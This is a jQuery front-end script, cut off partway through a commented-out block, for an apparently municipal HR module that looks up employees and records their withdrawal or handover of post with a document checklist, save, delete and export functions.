var fecha_ret = '';
$(document).ready(function () {
// $("#btnBuscar").hide()
  $(document).on("click", ".btnGuardar", function () {
    var frm = $(this).parents('form:first').addClass('was-validated');
    invalid = $(frm).find('.form-control:invalid').length
    // Se continua al siguiente paso si el formulario no tiene datos invalidos
    if (invalid == 0) {
      $(this).html('GUARDAR').prop('disabled', true)
      datos_retiro = $(this).parents('.retiros_f');
      guardarRetiro(datos_retiro)
    }
  })

  $(document).on("click", ".delete_fun", function () {
    var opcion = confirm("Desea eliminar este usuario");
    if (opcion == true) {
      id_retiro = $(this).parents('.retiros_f').find('.id_retiro').val()
      element = $(this).parents('.retiros_f');
      deleteRetiro(id_retiro, element);
    }
  });

  $(document).on('click', '.btnExcel', function () {
    loadReporteEcxel();
  });

  $(document).on('click', '.btnPdf', function () {
    loadReportePDF();
  });

  $(document).on('click', '.btnMakeEditar', function () {
    $(this).parents('.retiros_f').find('.desactivar').removeAttr('disabled');
  });

  $(document).on("click", "#btnBuscar", function () {
    $(this).html('Buscando...').prop('disabled', true)
    getRetiro(null, $('#identificacion').val())
    getFuncionario();
    // $("input[name=procesos_disc]").val(["NO APLICA"])
    // $("input[name=examen_med]").val(["NO APLICA"])
    // $("input[name=comprobante_dev]").val(["NO APLICA"])
    // $("input[name=hoja_vida]").val(["NO APLICA"])
    // $("input[name=declariacion_renta]").val(["NO APLICA"])
    // $("input[name=carnet_servidor]").val(["NO APLICA"])
    // $("#fecha_recepcion").val('')
    // $("#id_retiro").val('')
    // $("#tipo_retiro").val('')
    // $("#causa_retiro").val('')
  })

  $(document).on('change', '.tipo_retiro', function () {
    retiro = $(this).parents('.retiros_f').find('.tipo_retiro').val();
    elemento = $(this).parents('.retiros_f').find('.causa_retiro')
    cargarCausasRetiro(null, retiro, null, elemento)
  })

  $(document).on('change', '.causa_retiro', function () {
    // cargarCausaRet()
    if ($(this).val() == 17) {
      $(this).parents('.tipo_ret').find('.otro_').removeClass('d-none');
      $(this).parents('.tipo_ret').find('.otra_causa').attr('required', 'required')
    } else {
      $(this).parents('.tipo_ret').find('.otro_').addClass('d-none');
      $(this).parents('.tipo_ret').find('.otra_causa').removeAttr('required')
      $(this).parents('.tipo_ret').find('.otra_causa').val('')
    }
  })


  let params = new URLSearchParams(location.search);
  id_funcionario = params.get('id_funcionario');
  // id_retiro = params.get('id_retiro');
  if (id_funcionario != null) {
    getFuncionario(id_funcionario)
    getRetiro(id_funcionario)
  }
})

// function cargarCausaRet() {
//   $.post('ajaxGeneral.php?mode=causa_retiro', {
//     retiro: $('#causa_retiro').val()
//   }).done(function (data) {
//     if (data.trim() !== '') {
//       data = JSON.parse(data);
//       if (data.error != undefined) {
//         alertError(data.error)
//         return
//       } else {
//         $.each(data, function () {
//           $('#causa_retiro_com').val(this.tipo_retiro);
//         })
//       }
//     }
//   })
// }

function cargarCausasRetiro(id_causaretiro = null, retiro = null, cargado = null, elemento = null) {
  is_retiro = 0;
  if (retiro == 'Retiro')
    is_retiro = 1
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    // xhr.open("POST", 'http://jamundi.my//ajaxGeneral.php?mode=tipo_retiro&retiro=' + is_retiro);
    xhr.open("POST", 'https://app-jamundi.fksas.com/ajaxGeneral.php?mode=tipo_retiro&retiro=' + is_retiro);
    // xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest'); 
    // xhr.setRequestHeader("Access-Control-Allow-Origin", "http://localhost");
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let sel = '<option value="" selected>Seleccione...</option>';
      if (id_causaretiro != null)
        sel = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        text = this.tipo_retiro.substring(0, 100) + '...';
        if (id_causaretiro == this.id_tiposretiro)
          sel += `<option selected value="${this.id_tiposretiro}">${text}</option>`;
        else
          sel += `<option value="${this.id_tiposretiro}">${text}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (id_causaretiro != null || cargado != null)
        resolve(sel) // se accede con 'then()'
      else {
        $(elemento).html(sel)
      }
    }
    xhr.onerror = function () {
      reject(xhr.statusText) // se accede con 'catch()'
    }
    xhr.send();
  })
  // $.post('ajaxGeneral.php?mode=tipo_retiro', {
  //   retiro: is_retiro
  // }).done(function (data) {
  //   if (data.trim() !== '') {
  //     data = JSON.parse(data);
  //     if (data.error != undefined) {
  //       alertError(btoa('Error al guardar la retiro'))
  //       console.log(atob(data.error))
  //       return
  //     } else {
  //       sel = '<option value="" selected disabled>Seleccione...</option>';
  //       $.each(data, function () {
  //         text = this.tipo_retiro.substring(0, 100) + '...';
  //         sel += `<option value="${this.id_tiposretiro}">${text}</option>`;
  //       });
  //     }
  //     $('#causa_retiro').html(sel);
  //     if (id_causaretiro != null)
  //       $("#causa_retiro").val(id_causaretiro)
  //   }
  // })

}

function deleteRetiro(id_retiro, element) {
  $.post("set/retiro/eliminar", {
    id_retiro: id_retiro,
  }).done(function (data) {
    data = JSON.parse(data);
    if (data.error != undefined) {
      console.log(atob(data.error));
      alertError(btoa("Error al eliminar el retiro"));
    } else {
      alertSucces(data.success);
      $(element).remove()
    }
  });
}

function guardarRetiro(elemento) {
  data = new FormData();
  // funcionario_recibe: $("#funcionario_recibe").val(),
  data.append('id_retiro', $(elemento).find(".id_retiro").val());
  data.append('id_funcionario', $("#id_funcionario").val());
  data.append('fecha_recepcion', $(elemento).find(".fecha_recepcion").val());
  data.append('procesos_disc', $(elemento).find("input:radio[name^=procesos_disc]:checked").val());
  data.append('examen_med', $(elemento).find("input:radio[name^=examen_med]:checked").val());
  data.append('comprobante_dev', $(elemento).find("input:radio[name^=comprobante_dev]:checked").val());
  data.append('hoja_vida', $(elemento).find("input:radio[name^=hoja_vida]:checked").val());
  data.append('declariacion_renta', $(elemento).find("input:radio[name^=declariacion_renta]:checked").val());
  data.append('carnet_servidor', $(elemento).find("input:radio[name^=carnet_servidor]:checked").val());
  data.append('tipo_retiro', $(elemento).find(".tipo_retiro").val());
  data.append('causa_retiro', $(elemento).find(".causa_retiro").val());
  data.append('otra_causa', $(elemento).find(".otra_causa").val());
  data.append('fecha_retiro', $(elemento).find(".fecha_retiro").val());
  data.append('archivo', $(elemento).find(".archivo_ret")[0].files[0]);
  data.append('estadodoc', $("#estadodoc").val());
  // paz_salvo: $(elemento).find("#paz_salvo").val(),
  $.ajax({
    type: 'POST',
    url: 'set/retiro/crear',
    data: data,
    contentType: false,
    processData: false,
    success: function (data) {
      if (data.trim() !== '') {
        data = JSON.parse(data);
        if (data.error != undefined) {
          alertError(btoa('Error al crear el retiro'));
          console.log(atob(data.error))
          return
        }
        if (data.error_arc != undefined) {
          alertError(data.error_arc);
          // console.log(atob(data.error))
          return
        }
        if (data.success != undefined) {
          /*$(`#razon,#abrev,#ident,#num_ident,#regimen,
            #ciudad,#dir,#telefono,#celular,#fax,
            #email,#observa,#banco,#tipo_cuenta,
            #num_cuenta`).val('')*/
          alertSucces(data.success)
        }
        // R_borrarDatos()
      }
    }
    // $.post('set/retiro/crear', {
    //   general: JSON.stringify(data)
    // }).done(function (data) {
    //   if (data.trim() !== '') {
    //     data = JSON.parse(data);
    //     // objMsjAJX.sel['msj'] = "#MsjAJX";
    //     if (data.error != undefined) {
    //       alertError(data.error)
    //       return
    //     }
    //     if (data.success != undefined) {
    //       alertSucces(data.success)
    //     }
    //   }

  }).always(function () {
    $('#btnGuardar').html('<i class="fa fa-save"></i> GUARDAR').prop('disabled', false)
      .parents('form:first').removeClass('was-validated');

  });
}



function getFuncionario(id_funcionario = null) {
  documento = $("#identificacion").val() == '' ? null : $("#identificacion").val();
  $.post('ajaxGeneral.php?mode=getFuncionario_2', {
    documento: documento,
    id_funcionario: id_funcionario
  }).done(function (data) {
    if (data.trim() !== '') {
      data = JSON.parse(data);
      $('#lista_chequeo').addClass('d-none')
      $('#tipo_ret').addClass('d-none')
      if (data.error != undefined) {
        alertError(data.error)
        $("#nombres").val('')
        $("#identificacion").val('')
        $("#direccion").val('')
        $("#telefono").val('')
        $("#correo").val('')
        $("#cargo_propiedad").val('')
        $("#cargo").val('')
        $("#nivel").val('')
        $("#codigo").val('')
        $("#grado").val('')
        $("#Dependencia").val('')
        $("#sede").val('')
        $("#id_funcionario").val('')
        $(".fecha_retiro").val('')
        return
      }
      $('#lista_chequeo').removeClass('d-none')
      $('#tipo_ret').removeClass('d-none')
      $(data).each(function () {
        $("#nombres").val(this.nombre + " " + this.apellidos)
        $("#direccion").val(this.direccion)
        $("#identificacion").attr("disabled",true)
        $("#identificacion").val(this.documento)
        $("#telefono").val(this.celular)
        $("#correo").val(this.email)
        $("#cargo_propiedad").val(this.cargo)
        $("#cargo").val(this.cargo)
        $("#nivel").val(this.nivel)
        $("#codigo").val(this.codigo)
        $("#grado").val(this.grado)
        $("#Dependencia").val(this.dependencia)
        $("#sede").val(this.sede)
        $("#id_funcionario").val(this.id_funcionario)
        fecha_ret = this.fecha_retiro;
      });
    }
  }).always(function () {
    $('#btnBuscar').html('<i class="fa fa-eye"></i> BUSCAR').prop('disabled', false)
      .parents('form:first').removeClass('was-validated');

  });
}

function getRetiro(id_funcionario = null, cedula = null) {
  $.post('ajaxGeneral.php?mode=getRetiro', {
    id_funcionario: id_funcionario,
    cedula: cedula
  }).done(async function (data) {
    let fecha = new Date();
    let mes = fecha.getMonth() + 1 ;
    let dia = fecha.getDate();
    let ano = fecha.getFullYear();
    mes_2 = mes < 10 ? '0' + mes : mes;
    let fecha_creacion = ano + '-' + mes_2 + '-' + dia;
    if (data.trim() !== '') {
      data = JSON.parse(data);
      $('#retiros').html('');
      $('#lista_chequeo').addClass('d-none')
      $('#tipo_ret').addClass('d-none')
      if (data.error != undefined || data.length == 0) {
        retiro = `<div class="row retiros_f">
        <div class="col-md-12 mb-2 tipo_ret">
          <h6 class="submenus">TIPO DE ENTREGA</h6>
          <div class="secciones">
            <div class="row padding-secciones">
              <div class="col-md-4 mb-2">
                <label class="label-form">Tipo de entrega <span style="color: red;">*</span></label>
                <select class="form-control input-form color-t border-required tipo_retiro" placeholder='Cargo...' required="">
                  <option value="" selected disabled>Seleccione...</option>
                  <option value="Retiro">Retiro</option>
                  <option value="Entrega del cargo">Entrega del cargo</option>
                </select>
                <div class="invalid-feedback">Debe ingresar la identificación</div>
              </div>
              <div class="col-md-4 mb-2">
                <label class="label-form" for="modo_trabajo">Causas de retito <span style="color: red;">*</span></label>
                <select class="form-control input-form color-t border-required causa_retiro" placeholder='Cargo...' required="">
                  <option value="" selected disabled>Seleccione...</option>
                </select>
              </div>
              <div class="col-md-4 mb-2 d-none otro_">
                <label class="label-form" for="modo_trabajo">Cual? <span style="color: red;">*</span></label>
                <input type="text" class="form-control input-form color-t border-required otra_causa">
              </div>
              <!-- <div class="col-md-6 mb-2">
            <input disabled type="text" class="form-control input-form color-t border-required" id="causa_retiro_com" disabled>
          </div> -->
            </div>
          </div>
        </div>
        <div class="col-md-12 mb-2 lista_chequeo">
          <h6 class="submenus">Lista de Chequeo de Documentos</h6>
          <input type="hidden" class="id_retiro">
          <div class="secciones">
            <div class="row padding-secciones">
            <div class="col-md-4">
            <label for="sexo" class="label-form">1. Hoja de vida de la función pública (SIGEP).</label>
            <div class="form-inline">
              <div class="custom-control custom-radio pr-3">
                <label class="custom-control-label label-form" for="si_procesos_4">Si</label>
                <input type="radio" class="custom-control-input si_procesos_4" name="hoja_vida" value="SI">
                <!-- </div>
            <div class="custom-control custom-radio pr-3"> -->
                <label class="custom-control-label label-form" for="no_procesos_4">No</label>
                <input type="radio" class="custom-control-input no_procesos_4" name="hoja_vida" value="NO">
                <label class="custom-control-label label-form" for="no_aplica_4">No Aplica</label>
                <input type="radio" class="custom-control-input no_aplica_4" name="hoja_vida" checked value="NO APLICA">
                <div class="invalid-feedback">
                  Esta opción es requerida
                </div>
              </div>
            </div>
          </div>

          <div class="col-md-4">
          <label for="sexo" class="label-form">2. Declaración de bienes y rentas (SIGEP).</label>
          <div class="form-inline">
            <div class="custom-control custom-radio pr-3">
              <label class="custom-control-label label-form" for="si_procesos_5">Si</label>
              <input type="radio" class="custom-control-input si_procesos_5" name="declariacion_renta" value="SI">
              <!-- </div>
          <div class="custom-control custom-radio pr-3"> -->
              <label class="custom-control-label label-form" for="no_procesos_5">No</label>
              <input type="radio" class="custom-control-input no_procesos_5" name="declariacion_renta" value="NO">
              <label class="custom-control-label label-form" for="no_aplica_5">No Aplica</label>
              <input type="radio" class="custom-control-input no_aplica_5" name="declariacion_renta" checked value="NO APLICA">
              <div class="invalid-feedback">
                Esta opción es requerida
              </div>
            </div>
          </div>
        </div>

              <div class="col-md-4" style="Display:none">
                <label for="sexo" class="label-form">1. Acta de informe de gestión para entrega del cargo.</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos">Si</label>
                    <input type="radio" class="custom-control-input si_procesos" name="procesos_disc" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos">No</label>
                    <input type="radio" class="custom-control-input no_procesos" name="procesos_disc" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica" name="procesos_disc" checked value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-4">
                <label for="sexo" class="label-form">3. Encuesta de retiro</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos_3">Si</label>
                    <input type="radio" class="custom-control-input si_procesos_3" name="comprobante_dev" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos_3">No</label>
                    <input type="radio" class="custom-control-input no_procesos_3" name="comprobante_dev" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica_3">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica_3" name="comprobante_dev" checked value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>

              <div class="col-md-4">
              <label for="sexo" class="label-form">4. Carné de servidor público (en caso de que aplique).</label>
              <div class="form-inline">
                <div class="custom-control custom-radio pr-3">
                  <label class="custom-control-label label-form" for="si_procesos_6">Si</label>
                  <input type="radio" class="custom-control-input si_procesos_6" name="carnet_servidor" value="SI">
                  <!-- </div>
              <div class="custom-control custom-radio pr-3"> -->
                  <label class="custom-control-label label-form" for="no_procesos_6">No</label>
                  <input type="radio" class="custom-control-input no_procesos_6" name="carnet_servidor" value="NO">
                  <label class="custom-control-label label-form" for="no_aplica_6">No Aplica</label>
                  <input type="radio" class="custom-control-input no_aplica_6" name="carnet_servidor" checked value="NO APLICA">
                  <div class="invalid-feedback">
                    Esta opción es requerida
                  </div>
                </div>
              </div>
            </div>

              <div class="col-md-4" style="display:none">
              <label for="sexo" class="label-form">5. Examen médico de egreso de la entidad. </label>
              <div class="form-inline">
                <div class="custom-control custom-radio pr-3">
                  <label class="custom-control-label label-form" for="si_procesos_2">Si</label>
                  <input type="radio" class="custom-control-input si_procesos_2" name="examen_med" value="SI">
                  <!-- </div>
              <div class="custom-control custom-radio pr-3"> -->
                  <label class="custom-control-label label-form" for="no_procesos_2">No</label>
                  <input type="radio" class="custom-control-input no_procesos_2" name="examen_med" value="NO">
                  <label class="custom-control-label label-form" for="no_aplica_2">No Aplica</label>
                  <input type="radio" class="custom-control-input no_aplica_2" name="examen_med" checked value="NO APLICA">
                  <div class="invalid-feedback">
                    Esta opción es requerida
                  </div>
                </div>
              </div>
            </div>
            
             
              <div class="row mt-3">
                <!-- <div class="col-md-4">
              <label class="label-form">abjuntar paz y salvo</label>
              <input type="file" class="form-control input-form color-t border-required paz_salvo" name="paz_salvo" required placeholder="Subir Paz y Salvo">
            </div> -->
                <div class="col-md-4 mb-2">
                  <label class="label-form">Fecha de novedad</label>
                  <input type="date" class="form-control input-form color-t border-required fecha_retiro" name="fecha_retiro" maxlength="255" value="${fecha_ret}">
                  <div class="invalid-feedback">
                    Esta opción es requerida
                  </div>
                </div>
                <div class="col-md-4 mb-2">
                  <label for="fecha_recepcion" class="label-form">Fecha de recepción</label>
                  <input type="date" class="form-control input-form color-t border-required fecha_recepcion" required>
                  <div class="invalid-feedback">Debe seleccionar la fecha.</div>
                </div>
                <div class="col-md-4 mb-2">
                <label class="label-form" for="modo_trabajo">Abjuntar un archivo</label>
                <input type="file" class="form-control input-form color-t border-required archivo_ret" name="archivo_ret " accept=".doc,.docx, .pdf" maxlength="255">
                </div>
              </div>
              <div class="col-md-4 mb-2">
              <label for="fecha_creacion" class="label-form">Estado de documentos</label>
              <select id="estadodoc" class="form-control input-form color-t border-required desactivar" disabled placeholder='Seleccione estados...' required="">
              <option value="pendiente" selected>Pendiente</option>
              <option value="ok" selected>Ok</option>
            </select>
            </div>
            </div>
          </div>
        </div>

        <div class="col-md-12 mb-5">
          <button class="btn color-button btnGuardar" style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
        </div>
      </div>`;
        $('#retiros').html(retiro);
        // alertError(data.error)
        return
      }
      $('#lista_chequeo').removeClass('d-none')
      $('#tipo_ret').removeClass('d-none')
      // $(data).each(function () {
      for (i = 0; i < data.length; i++) {
        fecha_crea = data[i]['fecha_creacion'] != undefined ? data[i]['fecha_creacion'] : fecha_creacion;
        retiro = `<div class="row retiros_f">
        <div class="col-md-12 mt-3" style="">
                <!-- <button class="btn btn-danger btn-sm desactivar delete_fun" disabled style="float:right; margin: 0 15px;" type="button"> <i class="fa fa-save"></i> ELIMINAR</button>
                <button class="btn color-button btnMakeSaldoinicla desactivar" disabled style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
                <button class="btn color-button btnMakeEditar" style="float:right; margin: 0 15px;" type="button"> <i class="fa fa-save"></i> EDITAR</button> -->
                <button class="btn btn-otros m-1 delete_fun desactivar" disabled style="float:right" type="button"> <i class="fa fa-trash-o"></i> ELIMINAR</button>          
                <button class="btn btn-otros m-1 btnPdf" style="float:right" type="button"> <i class="fa fa-file-pdf-o"></i> PDF</button>
                <button class="btn btn-otros m-1 btnExcel" style="float:right" type="button"> <i class="fa fa-file-excel-o"></i> EXCEL</button>
                <button class="btn btn-otros m-1 btnMakeEditar" style="float:right" type="button"> <i class="fa fa-pencil"></i> EDITAR</button>
              </div>        
        <div class="col-md-12 mb-2 tipo_ret">
          <h6 class="submenus">TIPO DE ENTREGA</h6>
          <div class="secciones">
            <div class="row padding-secciones">
              <div class="col-md-4 mb-2">
                <label class="label-form">tipo de entrega <span style="color: red;">*</span></label>
                <select class="form-control input-form color-t border-required tipo_retiro " disabled placeholder='Cargo...' required="">
                  <option value="" disabled>Seleccione...</option>
                  <option value="Retiro" ${data[i]['tipo_retiro'] == 'Retiro' ? 'selected' : ''}>Retiro</option>
                  <option value="Entrega del cargo" ${data[i]['tipo_retiro'] == 'Entrega del cargo' ? 'selected' : ''}>Entrega del cargo</option>
                </select>
                <div class="invalid-feedback">Debe ingresar la identificación</div>
              </div>
              <div class="col-md-4 mb-2">
                <label class="label-form" for="modo_trabajo">Causas de retito <span style="color: red;">*</span></label>
                <select class="form-control input-form color-t border-required causa_retiro desactivar" disabled placeholder='Cargo...' required="">
                  ${await cargarCausasRetiro(data[i]['id_causaretiro'], data[i]['tipo_retiro'], true)}
                </select>
              </div>
              <div class="col-md-4 mb-2 ${data[i]['id_causaretiro'] != 17 ? 'd-none' : ''} otro_">
                <label class="label-form" for="modo_trabajo">Cual? <span style="color: red;">*</span></label>
                <input type="text" value="${data[i]['otro']}" class="form-control input-form color-t border-required otra_causa desactivar" disabled>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-12 mb-2 lista_chequeo">
          <h6 class="submenus">Lista de Chequeo de Documentos</h6>
          <input type="hidden" value="${data[i]['id_retiro']}" class="id_retiro">
          <div class="secciones">
            <div class="row padding-secciones">
              <div class="col-md-4">
                <label for="sexo" class="label-form">1. Acta de informe de gestión para entrega del cargo.</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos">Si</label>
                    <input type="radio" class="custom-control-input si_procesos  desactivar" disabled ${data[i]['acta_informe'] == 'SI' ? 'checked' : ''} name="procesos_disc${i}" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos">No</label>
                    <input type="radio" class="custom-control-input no_procesos  desactivar" disabled ${data[i]['acta_informe'] == 'NO' ? 'checked' : ''} name="procesos_disc${i}" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica desactivar" disabled ${data[i]['acta_informe'] == 'NO APLICA' ? 'checked' : ''} name="procesos_disc${i}" value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-4">
                <label for="sexo" class="label-form">2. Examen médico de egreso de la entidad. </label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos_2">Si</label>
                    <input type="radio" class="custom-control-input si_procesos_2 desactivar" disabled ${data[i]['examen_medico'] == 'SI' ? 'checked' : ''} name="examen_med${i}" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos_2">No</label>
                    <input type="radio" class="custom-control-input no_procesos_2 desactivar" disabled ${data[i]['examen_medico'] == 'NO' ? 'checked' : ''} name="examen_med${i}" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica_2">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica_2 desactivar" disabled ${data[i]['examen_medico'] == 'NO APLICA' ? 'checked' : ''} name="examen_med${i}" value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-4">
                <label for="sexo" class="label-form">3. Comprobante devolución de bienes al Almacén General – paz y salvo</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos_3">Si</label>
                    <input type="radio" class="custom-control-input si_procesos_3 desactivar" disabled ${data[i]['comprovante_devolucion'] == 'SI' ? 'checked' : ''} name="comprobante_dev${i}" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos_3">No</label>
                    <input type="radio" class="custom-control-input no_procesos_3 desactivar" disabled ${data[i]['comprovante_devolucion'] == 'NO' ? 'checked' : ''} name="comprobante_dev${i}" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica_3">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica_3 desactivar" disabled ${data[i]['comprovante_devolucion'] == 'NO APLICA' ? 'checked' : ''} name="comprobante_dev${i}" value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-4">
                <label for="sexo" class="label-form">4. Hoja de vida de la función pública (SIGEP) actualizada.</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos_4">Si</label>
                    <input type="radio" class="custom-control-input si_procesos_4 desactivar" disabled ${data[i]['hoja_sigep'] == 'SI' ? 'checked' : ''} name="hoja_vida${i}" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos_4">No</label>
                    <input type="radio" class="custom-control-input no_procesos_4 desactivar" disabled ${data[i]['hoja_sigep'] == 'NO' ? 'checked' : ''} name="hoja_vida${i}" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica_4">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica_4 desactivar" disabled ${data[i]['hoja_sigep'] == 'NO APLICA' ? 'checked' : ''} name="hoja_vida${i}" value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-4">
                <label for="sexo" class="label-form">5. Declaración de bienes y rentas (SIGEP) de retiro.</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos_5">Si</label>
                    <input type="radio" class="custom-control-input si_procesos_5 desactivar" disabled ${data[i]['declaracion_sigep'] == 'SI' ? 'checked' : ''} name="declariacion_renta${i}" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos_5">No</label>
                    <input type="radio" class="custom-control-input no_procesos_5 desactivar" disabled ${data[i]['declaracion_sigep'] == 'NO' ? 'checked' : ''} name="declariacion_renta${i}" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica_5">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica_5 desactivar" disabled ${data[i]['declaracion_sigep'] == 'NO APLICA' ? 'checked' : ''} name="declariacion_renta${i}" value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-4">
                <label for="sexo" class="label-form">6. Carnet de servidor público (en caso de que aplique).</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos_6">Si</label>
                    <input type="radio" class="custom-control-input si_procesos_6 desactivar" disabled ${data[i]['carnet_servidor'] == 'SI' ? 'checked' : ''} name="carnet_servidor${i}" value="SI">
                    <!-- </div>
                <div class="custom-control custom-radio pr-3"> -->
                    <label class="custom-control-label label-form" for="no_procesos_6">No</label>
                    <input type="radio" class="custom-control-input no_procesos_6 desactivar" disabled ${data[i]['carnet_servidor'] == 'NO' ? 'checked' : ''} name="carnet_servidor${i}" value="NO">
                    <label class="custom-control-label label-form" for="no_aplica_6">No Aplica</label>
                    <input type="radio" class="custom-control-input no_aplica_6 desactivar" disabled ${data[i]['carnet_servidor'] == 'NO APLICA' ? 'checked' : ''} name="carnet_servidor${i}" value="NO APLICA">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
              <div class="row mt-3">
                <div class="col-md-4 mb-2">
                  <label class="label-form">Fecha de Novedad</label>
                  <input type="date" class="form-control input-form color-t border-required fecha_retiro" disabled name="fecha_retiro" maxlength="255" value="${data[i]['fecha_recepcion'] == undefined || data[i]['fecha_recepcion'] == null ? fecha_ret : data[i]['fecha_recepcion']}" >
                  <div class="invalid-feedback">
                    Esta opción es requerida
                  </div>
                </div>
                <div class="col-md-4 mb-2">
                  <label class="label-form" for="modo_trabajo">Abjuntar un archivo</label>
                  <input type="file" class="form-control input-form color-t border-required archivo_ret desactivar" disabled name="archivo_ret " accept=".doc,.docx, .pdf" maxlength="255">
                </div>
                <div class="col-md-4 mb-2">
                  <label for="fecha_creacion" class="label-form">Fecha de creación</label>
                  <input type="date" class="form-control input-form color-t border-required fecha_creacion" value="${fecha_crea}" disabled required>
                  <div class="invalid-feedback">Debe seleccionar la fecha.</div>
                </div>
                <div class="col-md-4 mb-2">
                  <label for="fecha_creacion" class="label-form">Estado de documentos</label>
                  <select id="estadodoc" class="form-control input-form color-t border-required desactivar" disabled placeholder='Seleccione estados...' required="">
                  <option value="">Seleccione estado</option>
                  <option value="pendiente" ${data[i]['estado'] == "pendiente" ?"selected":''} >Pendiente</option>
                  <option value="ok"  ${data[i]['estado'] == "ok" ?"selected":''}>Ok</option>
                </select>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-12 mb-5">
          <button class="btn color-button btnGuardar desactivar" disabled style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
        </div>
      </div>`;
        $('#retiros').html(retiro);


      // if (i == (data.length - 1) && cedula != null) {
      //     retiro = `<div class="row retiros_f">
      //   <div class="col-md-12 mb-2 tipo_ret">
      //     <h6 class="submenus">TIPO DE ENTREGA</h6>
      //     <div class="secciones">
      //       <div class="row padding-secciones">
      //         <div class="col-md-4 mb-2">
      //           <label class="label-form">tipo de entrega <span style="color: red;">*</span></label>
      //           <select class="form-control input-form color-t border-required tipo_retiro" placeholder='Cargo...' required="">
      //             <option value="" disabled>Seleccione...</option>
      //             <option value="Retiro" ${data[i]['tipo_retiro'] == 'Retiro' ? 'selected' : ''}>Retiro</option>
      //             <option value="Entrega del cargo" ${data[i]['tipo_retiro'] == 'Entrega del cargo' ? 'selected' : ''}>Entrega del cargo</option>
      //           </select>
      //           <div class="invalid-feedback">Debe ingresar la identificación</div>
      //         </div>
      //         <div class="col-md-4 mb-2">
      //           <label class="label-form" for="modo_trabajo">Causas de retito <span style="color: red;">*</span></label>
      //           <select class="form-control input-form color-t border-required causa_retiro" placeholder='Cargo...' required="">
      //             ${await cargarCausasRetiro(data[i]['id_causaretiro'], data[i]['tipo_retiro'], true)}
      //           </select>
      //         </div>
      //         <div class="col-md-4 mb-2 ${data[i]['id_causaretiro'] != 17 ? 'd-none' : ''} otro_">
      //           <label class="label-form" for="modo_trabajo">Cual? <span style="color: red;">*</span></label>
      //           <input type="text" value="${data[i]['otro']}" class="form-control input-form color-t border-required otra_causa">
      //         </div>
      //       </div>
      //     </div>
      //   </div>
      //   <div class="col-md-12 mb-2 lista_chequeo">
      //     <h6 class="submenus">Lista de Chequeo de Documentos</h6>
      //     <input type="hidden" class="id_retiro">
      //     <div class="secciones">
      //       <div class="row padding-secciones">
      //         <div class="col-md-4">
      //           <label for="sexo" class="label-form">1. Acta de informe de gestión para entrega del cargo.</label>
      //           <div class="form-inline">
      //             <div class="custom-control custom-radio pr-3">
